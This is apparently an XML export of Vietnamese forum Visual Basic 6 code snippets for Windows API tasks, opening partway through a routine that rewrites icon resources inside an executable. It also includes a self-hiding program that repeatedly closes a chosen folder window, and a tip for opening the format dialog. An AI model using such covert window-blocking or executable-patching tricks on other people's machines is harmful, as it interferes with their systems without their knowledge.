                  ReDim Preserve DataEntries(iLvl3) As RESOURCE_DATA_ENTRY
                  ReadFile hFile, DataEntries(iLvl3), 16, BytesRead, ByVal 0&amp;
                  ' Jump to and read ICON_DIR structure
                  Cursor = RVA_to_Offset(DataEntries(iLvl3).Offset)
                  SetFilePointer hFile, Cursor, 0, 0
                  ReadFile hFile, IcoDir, 6, BytesRead, ByVal 0&amp;
                  For intC = 1 To IcoDir.Count
                     WriteFile hFile, DIBAttrib, Len(DIBAttrib) - 4, BytesRead, ByVal 0&amp;
                     SetFilePointer hFile, 2, 0, 1
                  Next intC
               Next iLvl3
            Next iLvl2
         ElseIf L1Entries(iLvl1).Name = 3 Then
            CopyMemory Cursor, L1Entries(iLvl1).Offset, 3
            Cursor = Cursor + ResTree
            SetFilePointer hFile, ByVal Cursor, 0, 0
            ' Read second-level directory
            ReadFile hFile, L2Root(iLvl1), 16, BytesRead, ByVal 0&amp;
            ReDim L2Entries(L2Root(iLvl1).NamedEntries + L2Root(iLvl1).IDEntries) As RESOURCE_DIR_ENTRY
            ReDim L3Root(L2Root(iLvl1).NamedEntries + L2Root(iLvl1).IDEntries) As IMAGE_RESOURCE_DIR
            For iLvl2 = 1 To (L2Root(iLvl1).NamedEntries + L2Root(iLvl1).IDEntries)
               CopyMemory Cursor, L1Entries(iLvl1).Offset, 3
               Cursor = Cursor + ResTree
               SetFilePointer hFile, Cursor + 8 + (iLvl2 * 8), 0, 0
               ReadFile hFile, L2Entries(iLvl2), 8, BytesRead, ByVal 0&amp;
               CopyMemory Cursor, L2Entries(iLvl2).Offset, 3
               Cursor = Cursor + ResTree
               SetFilePointer hFile, Cursor, 0, 0
               ' Read thrid-level directory
               ReadFile hFile, L3Root(iLvl2), 16, BytesRead, ByVal 0&amp;
               ReDim L3Entries(L3Root(iLvl2).NamedEntries + L3Root(iLvl2).IDEntries) As RESOURCE_DIR_ENTRY
               For iLvl3 = 1 To (L3Root(iLvl2).NamedEntries + L3Root(iLvl2).IDEntries)
                  ' Read third-level child nodes
                  CopyMemory Cursor, L2Entries(iLvl2).Offset, 3
                  Cursor = Cursor + ResTree + 8 + (iLvl3 * 8)
                  SetFilePointer hFile, Cursor, 0, 0
                  ReadFile hFile, L3Entries(iLvl3), 8, BytesRead, ByVal 0&amp;
                  ' Jump to and hack the RESOURCE_DATA_ENTRY
                  Cursor = L3Entries(iLvl3).Offset + ResTree
                  SetFilePointer hFile, Cursor, 0, 0
                  WriteFile hFile, DIBOffset, 4, BytesRead, ByVal 0&amp;
                  WriteFile hFile, CLng(DIBAttrib.dwBytesInRes + 40), 4, BytesRead, ByVal 0&amp;
               Next iLvl3
            Next iLvl2
         End If
      Next iLvl1
   Else
      HackDirectories = False
      Exit Function
   End If
   
   HackDirectories = True
   Exit Function
   
ErrHandler:
   MsgBox "An error occurred while modifying the resource directories. " _
    &amp; " Please make sure neither of the specified files are in use.", vbOKOnly + vbExclamation, _
    App.EXEName &amp; " - " &amp; eRR.Description
   
End Function
Private Function RVA_to_Offset(RVA As Long) As Long
On Error GoTo ErrHandler:
   Dim TempOffset    As Long           ' Difference of RVA and start of section
   TempOffset = RVA - ResSectionRVA
   If (TempOffset &gt;= 0) Then
      ' Calculate the file offset of the RVA
      RVA_to_Offset = ResSectionOffset + TempOffset
   Else
      RVA_to_Offset = -1
   End If
   Exit Function
   
ErrHandler:
   MsgBox "Error in RVA_to_Offset function: " &amp; eRR.Number &amp; ": " &amp; eRR.Description, _
    vbOKOnly + vbExclamation, App.EXEName &amp; " - Error"
End Function
 
Private Function Offset_to_RVA(Offset As Long) As Long
On Error GoTo ErrHandler:
 
   Dim TempOffset    As Long          ' Difference of Offset and start of section
   
   ' Get distance between offset and start of resource section
   TempOffset = Offset - ResSectionOffset
   If TempOffset &gt;= 0 Then
      ' Calculate RVA of the file offset
      Offset_to_RVA = ResSectionRVA + TempOffset
   Else
      Offset_to_RVA = -1
   End If
   Exit Function
   
ErrHandler:
  MsgBox "Error in Offset_to_RVA function: " &amp; eRR.Number &amp; ": " &amp; eRR.Description, _
    vbOKOnly + vbExclamation, App.EXEName &amp; " - Error"
   
End Function
 
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>093117043129</MaVD>
    <NoiDung>Private Declare Function PostMessage Lib "user32" Alias "PostMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, lParam As Any) As Long
 
Private Const MK_LBUTTON = &amp;H1
Private Const WM_LBUTTONDOWN = &amp;H201
Private Const WM_LBUTTONUP = &amp;H202
Private Const WM_LBUTTONDBLCLK = &amp;H203
 
Private Const MK_RBUTTON = &amp;H2
Private Const WM_RBUTTONDOWN = &amp;H204
Private Const WM_RBUTTONUP = &amp;H205
Private Const WM_RBUTTONDBLCLK = &amp;H206
 
Private Const MK_MBUTTON = &amp;H10
Private Const WM_MBUTTONDOWN = &amp;H207
Private Const WM_MBUTTONUP = &amp;H208
Private Const WM_MBUTTONDBLCLK = &amp;H209
 
Public Function MouseClick(ByVal sHwnd As Long, ByVal X As Long, ByVal Y As Long, ByVal Index As Long) As Long
Dim lParam As Long
Dim ISend As Long
    lParam = (Y * &amp;H10000) Or (X And &amp;HFFFF&amp;)
    Select Case Index
        Case 0 'Left Click
            ISend = PostMessage(sHwnd, WM_LBUTTONDOWN, MK_LBUTTON, ByVal lParam)
            ISend = PostMessage(sHwnd, WM_LBUTTONUP, 0, ByVal lParam)
        Case 1 'Left DblClick
            ISend = PostMessage(sHwnd, WM_LBUTTONDOWN, MK_LBUTTON, ByVal lParam)
            ISend = PostMessage(sHwnd, WM_LBUTTONUP, 0, ByVal lParam)
            ISend = PostMessage(sHwnd, WM_LBUTTONDBLCLK, MK_LBUTTON, ByVal lParam)
            ISend = PostMessage(sHwnd, WM_LBUTTONUP, 0, ByVal lParam)
        Case 2 'Middle Click
            ISend = PostMessage(sHwnd, WM_MBUTTONDOWN, MK_MBUTTON, ByVal lParam)
            ISend = PostMessage(sHwnd, WM_MBUTTONUP, 0, ByVal lParam)
        Case 3 'Middle DBlClick
            ISend = PostMessage(sHwnd, WM_MBUTTONDOWN, MK_MBUTTON, ByVal lParam)
            ISend = PostMessage(sHwnd, WM_MBUTTONUP, 0, ByVal lParam)
            ISend = PostMessage(sHwnd, WM_MBUTTONDBLCLK, MK_MBUTTON, ByVal lParam)
            ISend = PostMessage(sHwnd, WM_MBUTTONUP, 0, ByVal lParam)
        Case 4 'Right Click
            ISend = PostMessage(sHwnd, WM_RBUTTONDOWN, MK_RBUTTON, ByVal lParam)
            ISend = PostMessage(sHwnd, WM_RBUTTONUP, 0, ByVal lParam)
        Case 5 'Right DblClick
            ISend = PostMessage(sHwnd, WM_RBUTTONDOWN, MK_RBUTTON, ByVal lParam)
            ISend = PostMessage(sHwnd, WM_RBUTTONUP, 0, ByVal lParam)
            ISend = PostMessage(sHwnd, WM_RBUTTONDBLCLK, MK_RBUTTON, ByVal lParam)
            ISend = PostMessage(sHwnd, WM_RBUTTONUP, 0, ByVal lParam)
    End Select
End Function
 
Private Sub Command1_Click()
MouseClick Text1.hwnd, 50, 50, 1
End Sub
 
Private Sub text1_DblClick()
Text1.BackColor = Rnd * 16000000
End Sub
 
Private Sub Form_Load()
Text1.Top = 0: Text1.Left = 0: Text1.Height = 800: Text1.Width = 800
End Sub
 
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>091623051646</MaVD>
    <NoiDung>Chú ý: Nhớ đặt thuộc tính BorderStyle của Form là: 0 - None nhé

Const GWL_EXSTYLE = (-20)
Const WS_EX_TRANSPARENT = &amp;H20&amp;
Const HWND_NOTOPMOST = -2
Const SWP_FRAMECHANGED = &amp;H20
Const SWP_NOMOVE = &amp;H2
Const SWP_NOSIZE = &amp;H1
 
Private Declare Function SetWindowLong Lib "user32" Alias "SetWindowLongA" (ByVal hWnd As Long, ByVal nIndex As Long, ByVal dwNewLong As Long) As Long
Private Declare Function SetWindowPos Lib "user32" (ByVal hWnd As Long, ByVal hWndInsertAfter As Long, ByVal X As Long, ByVal Y As Long, ByVal Cx As Long, ByVal Cy As Long, ByVal wFlags As Long) As Long
 
Private Sub Form_Load()
SetWindowLong Me.hWnd, GWL_EXSTYLE, WS_EX_TRANSPARENT
SetWindowPos Me.hWnd, HWND_NOTOPMOST, 0&amp;, 0&amp;, 0&amp;, 0&amp;, SWP_FRAMECHANGED Or SWP_NOMOVE Or SWP_NOSIZE
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>093617043615</MaVD>
    <NoiDung>Private Declare Function SHGetSpecialFolderPath Lib "shell32.dll" Alias "SHGetSpecialFolderPathA" (ByVal hwndOwner As Long, ByVal lpszPath As String, ByVal nFolder As Long, ByVal fCreate As Long) As Long
 
Private Const CSIDL_FONTS = &amp;H14
Private Const CSIDL_DESKTOP = &amp;H0
Private Const CSIDL_FAVORITES = &amp;H6
Private Const CSIDL_RECENT = &amp;H8
Private Const CSIDL_COOKIES = &amp;H21
Private Const CSIDL_HISTORY = &amp;H22
 
Private Const NameSpace_MyComputer = "::{20D04FE0-3AEA-1069-A2D8-08002B30309D}"
Private Const NameSpace_RecycleBin = "::{645FF040-5081-101B-9F08-00AA002F954E}"
Private Const NameSpace_NetworkNeighborhood = "::{208D2C60-3AEA-1069-A2D7-08002B30309D}"
Private Const NameSpace_Dialup = "::{a4d92740-67cd-11cf-96f2-00aa00a11dd9}"
Private Const NameSpace_ControlPanel = "::{20D04FE0-3AEA-1069-A2D8-08002B30309D}\::{21EC2020-3AEA-1069-A2DD-08002B30309D}"
Private Const NameSpace_Printers = "::{20D04FE0-3AEA-1069-A2D8-08002B30309D}\::{2227A280-3AEA-1069-A2DE-08002B30309D}"
Private Const NameSpace_ScheduledTasks = "::{20D04FE0-3AEA-1069-A2D8-08002B30309D}\::{D6277990-4C6A-11CF-8D87-00AA0060F5BF}"
 
Private Const MAX_PATH = 260
 
 
Private Sub OpenExplorerWindow(FolderName As String)
    Shell "explorer " &amp; FolderName, vbNormalFocus
End Sub
 
Private Function TrimNull(Str1 As String) As String
    Dim Loc         As Integer
    
    Loc = InStr(Str1, Chr$(0))
    If Loc &lt;&gt; 0 Then
        TrimNull = Mid$(Str1, 1, Loc - 1)
    Else
        TrimNull = Str1
    End If
End Function
 
Private Function GetSpecialFolder(Folder As Long) As String
    Dim FolderPath          As String * MAX_PATH
    SHGetSpecialFolderPath 0, FolderPath, Folder, 0
    GetSpecialFolder = TrimNull(FolderPath)
End Function
 
Private Sub cmdControlPanel_Click()
    OpenExplorerWindow NameSpace_ControlPanel
End Sub
 
Private Sub cmdDialup_Click()
    OpenExplorerWindow NameSpace_Dialup
End Sub
 
Private Sub cmdCookies_Click()
    OpenExplorerWindow GetSpecialFolder(CSIDL_COOKIES)
End Sub
 
Private Sub cmdDesktop_Click()
    OpenExplorerWindow GetSpecialFolder(CSIDL_DESKTOP)
End Sub
 
Private Sub cmdFavorites_Click()
    OpenExplorerWindow GetSpecialFolder(CSIDL_FAVORITES)
End Sub
 
Private Sub cmdFonts_Click()
    OpenExplorerWindow GetSpecialFolder(CSIDL_FONTS)
End Sub
 
Private Sub cmdHistory_Click()
    OpenExplorerWindow GetSpecialFolder(CSIDL_HISTORY)
End Sub
 
Private Sub cmdMyComputer_Click()
    OpenExplorerWindow NameSpace_MyComputer
End Sub
 
Private Sub cmdNetworkNeighborhood_Click()
    OpenExplorerWindow NameSpace_NetworkNeighborhood
End Sub
 
Private Sub cmdPrinters_Click()
    OpenExplorerWindow NameSpace_Printers
End Sub
 
Private Sub cmdRecent_Click()
    OpenExplorerWindow GetSpecialFolder(CSIDL_RECENT)
End Sub
 
Private Sub cmdRecycleBin_Click()
    OpenExplorerWindow NameSpace_RecycleBin
End Sub
 
Private Sub cmdScheduledTasks_Click()
    OpenExplorerWindow NameSpace_ScheduledTasks
End Sub
 
 
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>093817043840</MaVD>
    <NoiDung>Bài này giới thiệu cách tính dung lượng cho các File có dung lượng vượt quá số dạng Long, VB không thể tính được và thường cho ra số âm

 
' Khai bao ham API

Private Declare Function CreateFile Lib "kernel32.dll" Alias "CreateFileW" ( _
       ByVal lpFileName As Long, ByVal dwDesiredAccess As Long,  _
       ByVal dwShareMode As Long, ByRef lpSecurityAttributes As Any , _
       ByVal dwCreationDisposition As Long, ByVal dwFlagsAndAttributes As Long, _
       ByVal hTemplateFile As Long) As Long
Private Declare Function CloseHandle Lib "kernel32.dll" ( _
       ByVal hObject As Long) As Long
Private Declare Function GetFileSizeEx Lib "kernel32.dll" (ByVal hFile As Long, _
       ByRef lpFileSize As Currency) As Long
 
Private Const GENERIC_ALL As Long = &amp;H10000000
Private Const FILE_SHARE_WRITE As Long = &amp;H2
Private Const FILE_SHARE_READ As Long = &amp;H1
Private Const OPEN_EXISTING As Long = 3


Function FileLenW( ByVal sFileName As String ) 'As Currency
     On Error Resume Next
     Dim hFile As Long,wSize As Long
     hFile=CreateFile( StrPtr( sFileName), GENERIC_ALL, FILE_SHARE_WRITE +FILE_SHARE_READ _
           ByVal 0&amp;, OPEN_EXISTING, ByVal 0&amp; )
     GetFileSizeEx hFile, wSize
     CloseHandle hFile
     
     ' FileLenW=IIf(FileLen(sFileName)&gt;0, FileLen(sFileName), wSize * 10000)
     FileLenW=  wSize * 10000 
 
End Function
 
' Cach dung
 MsgBox "File size : " &amp; FileLenW( "Đường dẫn tệp tin cần tính ")

 
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>094017044005</MaVD>
    <NoiDung> 
[color=#0000BF]Register Components without using Regsvr32.exe
 
NOTE: Check the improved version of this at:
 
 
Before you can use an DLL or an OCX you must register it. Registering a component places information about the control in the system registry. Once the control has been registered, applications and development environments can search the registry to determine which components have been installed.
 
Most developers use the Package and deployment wizard to register their components. However, it is occasionally useful to make your own setup kit. The most common method of doing this usually involves shelling Regsvr32.exe. The main problem with shelling Regsvr32.exe is that it is relatively difficult to see if the component was successfully registered. 
 
The following code shows how to register DLL/Ocx components (including ActiveX EXE's):
 
Option Explicit
 
Private Declare Function LoadLibraryA Lib "kernel32" (ByVal lLibFileName As String) As Long
Private Declare Function CreateThread Lib "kernel32" (lThreadAttributes As Any, ByVal lStackSize As Long, ByVal lStartAddress As Long, ByVal larameter As Long, ByVal lCreationFlags As Long, lThreadID As Long) As Long
Private Declare Function WaitForSingleObject Lib "kernel32" (ByVal hHandle As Long, ByVal lMilliseconds As Long) As Long
Private Declare Function GetProcAddress Lib "kernel32" (ByVal hModule As Long, ByVal lProcName As String) As Long
Private Declare Function CallWindowProc Lib "user32" Alias "CallWindowProcA" (ByVal lpPrevWndFunc As Long, ByVal hwnd As Long, ByVal Msg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long
Private Declare Function FreeLibrary Lib "kernel32" (ByVal hLibModule As Long) As Long
Private Declare Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long
Private Declare Function GetExitCodeThread Lib "kernel32" (ByVal hThread As Long, lExitCode As Long) As Long
Private Declare Sub ExitThread Lib "kernel32" (ByVal lExitCode As Long)
 
'Purpose   :    This function registers and Unregisters OLE components
'Inputs    :    sFilePath                       The path to the DLL/OCX or ActiveX EXE
'               bRegister                       If True Registers the control, else unregisters control
'Outputs   :    Returns True if successful
'Notes     :    This is the API equivalent of RegSvr32.exe.
'Example   :
'               If RegisterComponent("C:\MyPath\MyFile.dll") = True Then
'                   Msgbox "Component Successfully Registered"
'               Else
'                   Msgbox "Failed to Registered Component"
'               End If
'Revisions :    1/Jan/2002. Updated to include code for registering ActiveX Exes.
 
Function RegisterComponent(ByVal sFilePath As String, Optional bRegister As Boolean = True) As Boolean
    Dim lLibAddress As Long, lProcAddress As Long, lThreadID As Long, lSuccess As Long, lExitCode As Long, lThread As Long
    Dim sRegister As String
    Const clMaxTimeWait As Long = 20000     'Wait 20 secs for register to complete
    
    On Error GoTo ErrFailed
    If Len(sFilePath) &gt; 0 And Len(Dir(sFilePath)) &gt; 0 Then
        'File exists
        If UCase$(Right$(sFilePath, 3)) = "EXE" Then
            'Register/Unregister ActiveX EXE
            If bRegister Then
                'Register EXE
                Shell sFilePath &amp; " /REGSERVER", vbHide
            Else
                'Unregister ActiveX EXE
                Shell sFilePath &amp; " /UNREGSERVER", vbHide
            End If
            RegisterComponent = True
        Else
            'Register/Unregister DLL
            If bRegister Then
                sRegister = "DllRegisterServer"
            Else
                sRegister = "DllUnRegisterServer"
            End If
            
            'Load library into current process
            lLibAddress = LoadLibraryA(sFilePath)
            
            If lLibAddress Then
                'Get address of the DLL function
                lProcAddress = GetProcAddress(lLibAddress, sRegister)
                If lProcAddress Then
                    lThread = CreateThread(ByVal 0&amp;, 0&amp;, ByVal lProcAddress, ByVal 0&amp;, 0&amp;, lThread)
                    If lThread Then
                        'Created thread and wait for it to terminate
                        lSuccess = (WaitForSingleObject(lThread, clMaxTimeWait) = 0)
                        If Not lSuccess Then
                            'Failed to register, close thread
                            Call GetExitCodeThread(lThread, lExitCode)
                            Call ExitThread(lExitCode)
                            RegisterComponent = False
                        Else
                            'Successfully registered component
                            RegisterComponent = True
                            Call CloseHandle(lThread)
                        End If
                    End If
                    Call FreeLibrary(lLibAddress)
                Else
                    'Object doesn't expose OLE interface
                    Call FreeLibrary(lLibAddress)
                End If
            End If
        End If
    End If
    Exit Function
 
ErrFailed:
    Debug.Print Err.Description
    Debug.Assert False
    On Error GoTo 0
End Function
[/color]
 
  
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000156</MaVD>
    <NoiDung>Chèn đoạn code này vào Module: 
Type SHELLEXECUTEINFO 
   cbSize As Long 
   fMask As Long 
   hwnd As Long 
   lpVerb As String 
   lpFile As String 
   lpParameters As String 
   lpDirectory As String 
   nShow As Long 
   hInstApp As Long 
   lpIDList As Long 
   lpClass As String 
   hkeyClass As Long 
   dwHotKey As Long 
   hIcon As Long 
   hProcess As Long 
End Type 
Public Const SEE_MASK_INVOKEIDLIST = &amp;HC 
Public Const SEE_MASK_NOCLOSEPROCESS = &amp;H40 
Public Const SEE_MASK_FLAG_NO_UI = &amp;H400 
Declare Function ShellExecuteEX Lib "shell32.dll" Alias "ShellExecuteEx" (SEI As SHELLEXECUTEINFO) As Long 
Public Sub ShowProps(FileName As String, OwnerhWnd As Long) 
   Dim SEI As SHELLEXECUTEINFO 
   Dim r As Long 
   With SEI 
      .cbSize = Len(SEI) 
      .fMask = SEE_MASK_NOCLOSEPROCESS Or _ 
      SEE_MASK_INVOKEIDLIST Or SEE_MASK_FLAG_NO_UI 
      .hwnd = OwnerhWnd 
      .lpVerb = "properties" 
      .lpFile = FileName 
      .lpParameters = vbNullChar 
      .lpDirectory = vbNullChar 
      .nShow = 0 
      .hInstApp = 0 
      .lpIDList = 0 
   End With 
   r = ShellExecuteEX(SEI) 
End Sub 

Và khi sử dụng thì gọi: 
Call ShowProps("c:\manguon player.exe", Me.hwnd)

---------
* sửa chữ .lpVerb = "properties" =&gt; .lpVerb = "format" là có ngay hộp thoại FORMAT 
* .lpVerb = "openas" =&gt; Hộp thoại Open With </NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>095017045059</MaVD>
    <NoiDung>Private Function FileExist(sFile As String) As Boolean
    'Kiểm tra sự tồn tại của file
    FileExist = Not (Dir$(sFile, vbHidden Or vbSystem) = "")
End Function
 
Private Function RemoveDeadEntries(ctrListBox As ListBox)
'Nếu trong listbox có path của file mà file đó không tồn tại trong đĩa thì xóa path đó. (làm list nhạc)
    Dim i As Long
    Dim J As Long
    For i = 0 To (ctrListBox.ListCount - 1)
        For J = ctrListBox.ListIndex + 1 To i
            If FileExist(ctrListBox.List(J)) = False Then
                ctrListBox.RemoveItem J
            End If
        Next
    Next
End Function
 
Private Sub Command1_Click()
    RemoveDeadEntries List1
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>095317045337</MaVD>
    <NoiDung>'Cần 1 CheckBox
Private Sub Check1_Click()
    If Check1.Value = 1 Then
        'Tạo ổ đĩa ảo "V:" bằng thư mục "Tin" trong ổ C:
        Shell "subst " &amp; "V:" &amp; Space$(1) &amp; "C:\Tin", vbHide
    Else
        'Xóa ổ đĩa ảo
        Shell "subst " &amp; "V: /d", vbHide
    End If
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>095417045452</MaVD>
    <NoiDung>Private Declare Function URLDownloadToFile Lib "urlmon" Alias "URLDownloadToFileA" (ByVal pCaller As Long, _
   ByVal szURL As String, ByVal szFileName As String, ByVal dwReserved As Long, ByVal lpfnCB As Long) As Long
Private Declare Function DeleteUrlCacheEntry Lib "Wininet.dll" Alias "DeleteUrlCacheEntryA" (ByVal lpszUrlName As String) As Long
'code truongphu
Private Function DownloadFile() As Long
szURL = "http://www.timeanddate.com/worldclock/city.html?n=95": szFileName = "C:\Date.sys"
 Call DeleteUrlCacheEntry(szURL)
  DownloadFile = URLDownloadToFile(0, szURL, szFileName, 0, 0)
End Function
 
Private Sub Command1_Click()
Call DownloadFile
  Set fso = CreateObject("Scripting.FileSystemObject").OpenTextFile("C:\Date.sys", 1)
  S = fso.ReadAll:   S = Right(S, Len(S) - InStrRev(S, "Current Time") - 48)
  S = Left(S, 35):   MsgBox Left(S, InStrRev(S, ":") - 1)
  Set fso = Nothing: Kill "C:\Date.sys"
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>095717045741</MaVD>
    <NoiDung>Private Declare Function GetForegroundWindow Lib "user32" () As Long
Private Declare Function GetWindowTextLength Lib "user32" _
Alias "GetWindowTextLengthA" (ByVal hwnd As Long) As Long
Private Declare Function GetWindowText Lib "user32" _
Alias "GetWindowTextA" (ByVal hwnd As Long, ByVal lpString As String, ByVal cch As Long) As Long
Private Declare Function GetParent Lib "user32" (ByVal hwnd As Long) As Long
 
Private Function GetActiveWindowTitle(ByVal ReturnParent As Boolean) As String
Dim i&amp;, j&amp;
i = GetForegroundWindow
    If ReturnParent Then
        Do While i &lt;&gt; 0
            j = i
            i = GetParent(i)
        Loop
        i = j
    End If
GetActiveWindowTitle = GetWindowTitle(i)
End Function
 
Private Function GetWindowTitle(ByVal hwnd As Long) As String
Dim l&amp;, s$
    l = GetWindowTextLength(hwnd)
    s = Space(l + 1)
 
    GetWindowText hwnd, s, l + 1
    GetWindowTitle = Left$(s, l)
    MsgBox "* Windows Title Of Exe: " &amp; GetWindowTitle &amp; vbCrLf &amp; "* hWnd of Exe: " &amp; hwnd
End Function
 
Private Sub Command1_Click()
Dim aaa, qqq$
aaa = Shell("Calc") '&lt;-- Ðu'a EXE path Ðã biêt vào Ðây !!
qqq = GetActiveWindowTitle(ReturnParent)
AppActivate aaa, True
End Sub
 
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>090217050253</MaVD>
    <NoiDung />
  </Vidu>
  <Vidu>
    <MaVD>091017051001</MaVD>
    <NoiDung>Vì khó thể hiện, mời các bạn xem bài</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>091317051340</MaVD>
    <NoiDung>Vẽ lên Form1: Timer1, command1, Dir1, Drive1, Label1

Private Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Long
Private Declare Function SendMessage Lib "user32" Alias "SendMessageA" (ByVal hWnd As Long, ByVal wMsg As Long, ByVal wParam As Long, lParam As Any) As Long
Const NILL = 0&amp;: Const WM_SYSCOMMAND = &amp;H112: Const SC_CLOSE = &amp;HF060
 
Private Sub Command1_Click()
MsgBox "Dùng Task Manager Ðê Tát Chuo'ng Trình"
Me.Hide    'truongphu 17 / 1 / 2009
End Sub
 
Private Sub Dir1_Click()
Label1.Caption = Dir1.List(Dir1.ListIndex)
End Sub
 
Private Sub Drive1_Change()
Dir1.Path = Drive1
End Sub
 
Public Sub CloseFolder(ByVal sWindow As String)
Dim hWndX As Long
hWndX = FindWindow(vbNullString, sWindow)
sCloseWindow = SendMessage(hWndX, WM_SYSCOMMAND, SC_CLOSE, NILL)
End Sub
 
Private Sub Timer1_Timer()
CloseFolder Label1.Caption
End Sub

</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>091517051517</MaVD>
    <NoiDung />
  </Vidu>
  <Vidu>
    <MaVD>094518024529</MaVD>
    <NoiDung>* Cách 1: Dùng hàm Shell, xuất kết quả ra file:
 
Private Sub Command2_Click()
Shell "cmd.exe /c ping caulacbovb.com &gt; c:\1.txt", vbHide
MsgBox "Ðã Xong"
End Sub
 
Private Sub Command3_Click()
Shell "cmd.exe /c dir c:\Progra~1 &gt; c:\2.txt", vbHide
MsgBox "Ðã Xong"
End Sub

* Cách 2 : Dùng WScript.Shell

Private Sub Command1_Click()
Set objShell = CreateObject("WScript.Shell")
a = objShell.Exec("cmd.exe /c ping caulacbovb.com").StdOut.ReadAll
MsgBox a
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>094718024726</MaVD>
    <NoiDung />
  </Vidu>
  <Vidu>
    <MaVD>094918024946</MaVD>
    <NoiDung> 
'Module
Option Explicit
 
'   Resolution Resize and Run Time Control Resize.
'Module for automatically resizing forms and
'controls with varying screen resolutions. This is
'an adaptation of a Microsoft Knowledge Base
'article. The example worked as it was but half the
'code was on the form. I wanted a complete module
'to add to any app easily. To use it simply add
'"Call AdjustForm(Me)" to the Form_Load event
'and "Call FormResize(Me)" to the Form_Resize
'event.  Also change the design time resolution
'values. It is coded to 640x480 since my video
'adapter will not support higher at 16 bit color.
'The Microsoft article said it was for VB5/6 but
'I have only VB4. If you have trouble, make one for
'yourself...use at your own risk, else e-mail me
'at nwsr2@netscape.net.        No API's
 
Public Xtwips As Integer, Ytwips As Integer
Public Xpixels As Integer, Ypixels As Integer
 
Type FRMSIZE
   Height As Long
   Width As Long
End Type
 
Public RePosForm As Boolean
Public DoResize As Boolean
Dim MyForm As FRMSIZE
Dim DesignX As Integer
Dim DesignY As Integer
Dim ScaleFactorX As Single, ScaleFactorY As Single
 
 
Sub Resize_For_Resolution(ByVal SFX As Single, ByVal SFY As Single, MyForm As Form)
Dim I As Integer
Dim SFFont As Single
SFFont = (SFX + SFY) / 2
On Error Resume Next
With MyForm
  For I = 0 To .Count - 1
   If TypeOf .Controls(I) Is ComboBox Then
     .Controls(I).Left = .Controls(I).Left * SFX
     .Controls(I).Top = .Controls(I).Top * SFY
     .Controls(I).Width = .Controls(I).Width * SFX
   Else
     .Controls(I).Move .Controls(I).Left * SFX, _
      .Controls(I).Top * SFY, _
      .Controls(I).Width * SFX, _
      .Controls(I).Height * SFY
   End If
     .Controls(I).FontSize = .Controls(I).FontSize * SFFont
  Next I
  If RePosForm Then
     .Move .Left * SFX, .Top * SFY, .Width * SFX, .Height * SFY
  End If
End With
End Sub
 
 
Public Sub FormResize(TheForm As Form)
Dim ScaleFactorX As Single, ScaleFactorY As Single
If Not DoResize Then
   DoResize = True
   Exit Sub
End If
RePosForm = False
ScaleFactorX = TheForm.Width / MyForm.Width
ScaleFactorY = TheForm.Height / MyForm.Height
Resize_For_Resolution ScaleFactorX, ScaleFactorY, TheForm
MyForm.Height = TheForm.Height
MyForm.Width = TheForm.Width
End Sub
 
Public Sub AdjustForm(TheForm As Form)
Dim Res As String ' Returns resolution of system
' Put the design time resolution in here
DesignX = 640
DesignY = 480
RePosForm = True
DoResize = False
Xtwips = Screen.TwipsPerPixelX
Ytwips = Screen.TwipsPerPixelY
Ypixels = Screen.Height / Ytwips
Xpixels = Screen.Width / Xtwips
ScaleFactorX = (Xpixels / DesignX)
ScaleFactorY = (Ypixels / DesignY)
TheForm.ScaleMode = 1
Resize_For_Resolution ScaleFactorX, ScaleFactorY, TheForm
Res = Str$(Xpixels) + "  by " + Str$(Ypixels)
Debug.Print Res
MyForm.Height = TheForm.Height
MyForm.Width = TheForm.Width
 
End Sub
 
'Form
Option Explicit
 
Private Sub Form_Load()
Call AdjustForm(Me)
End Sub
 
Private Sub Form_Resize()
Call FormResize(Me)
End Sub
 
 
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>095218025213</MaVD>
    <NoiDung />
  </Vidu>
  <Vidu>
    <MaVD>095318025334</MaVD>
    <NoiDung />
  </Vidu>
  <Vidu>
    <MaVD>095518025514</MaVD>
    <NoiDung>Private Type MARGINS
  Left As Long
  Right As Long
  Top As Long
  Bottom As Long
End Type
 
Private Declare Function DwmExtendFrameIntoClientArea Lib "dwmapi.dll" (ByVal hwnd As Long, margin As MARGINS) As Long
Private Declare Function DwmIsCompositionEnabled Lib "dwmapi" (ByRef pfEnabled As Long) As Long  'Hàm này kie^?m tra xem
                                                                                                                                       'Aero Glass có enable hay ko
Private Sub Form_Load()
    On Error GoTo Nodwmapi
    Dim GlassEnable As Long
    DwmIsCompositionEnabled GlassEnable
    If CBool(GlassEnable) Then  '
        Dim m As MARGINS
        Me.BackColor = vbBlack
        m.Bottom = ScaleWidth / 2
        m.Top = ScaleHeight / 2
        m.Right = ScaleHeight / 2
        m.Left = ScaleWidth / 2
        DwmExtendFrameIntoClientArea hwnd, m
    End If
    Me.Caption = "Aero Glass is " &amp; CBool(GlassEnable)
    Exit Sub
Nodwmapi:
    Me.Caption = "Aero Glass is False"
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>090118030111</MaVD>
    <NoiDung>Cần CommonDialog1, Command1

Private Declare Function SHChangeIconDialog Lib "shell32" Alias "#62" (ByVal hOwner As Long, ByVal szFilename As Long, ByVal Reserved As Long, lpIconIndex As Long) As Long
 
Private Sub Command1_Click()
Const MAX_PATH As Long = 260
Dim sPath As String, lpIconIndex As Long
CommonDialog1.Filter = "DLL|*.Dll"
CommonDialog1.InitDir = "C:\Windows\System32\"
